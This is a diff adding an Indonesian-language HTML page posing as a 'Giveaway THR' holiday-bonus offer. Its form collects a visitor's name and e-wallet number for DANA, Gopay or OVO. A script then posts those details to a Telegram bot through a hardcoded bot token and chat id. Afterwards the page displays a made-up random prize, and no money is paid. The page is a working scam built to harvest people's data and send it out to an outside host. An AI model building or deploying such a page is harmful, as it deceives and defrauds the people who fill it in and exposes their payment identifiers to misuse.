@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Giveaway THR</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    input, select, button { margin: 8px 0; padding: 10px; width: 100%; }
+  </style>
+</head>
+<body>
+
+  <h2>Giveaway THR</h2>
+
+  <label>Nama:</label>
+  <input type="text" id="nama" required>
+
+  <label>Nomor Pembayaran (DANA/Gopay/OVO):</label>
+  <input type="text" id="nomor" required>
+
+  <label>Pilih Metode:</label>
+  <select id="metode">
+    <option value="Gopay">Gopay</option>
+    <option value="OVO">OVO</option>
+    <option value="DANA">DANA</option>
+  </select>
+
+  <button onclick="kirimData()">Dapatkan THR</button>
+
+  <p id="hasil"></p>
+
+  <script>
+    function kirimData() {
+      const nama = document.getElementById('nama').value;
+      const nomor = document.getElementById('nomor').value;
+      const metode = document.getElementById('metode').value;
+      const jumlah = Math.floor(Math.random() * (1000 - 50 + 1)) + 50;
+
+      const pesan = `THR Masuk!\nNama: ${nama}\nNomor: ${nomor}\nMetode: ${metode}\nJumlah: Rp${jumlah}`;
+
+      const botToken = "7779236534:AAEU6uV3iQxsPmBqv77YM1puM4H9bRXmvyE";
+      const chatId = "7799140879";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: pesan
+        })
+      })
+      .then(() => {
+        document.getElementById('hasil').innerText = `Selamat! Kamu mendapatkan Rp${jumlah}`;
+      })
+      .catch((error) => {
+        alert("Gagal mengirim ke Telegram");
+        console.error(error);
+      });
+    }
+  </script>
+
+</body>
+</html>
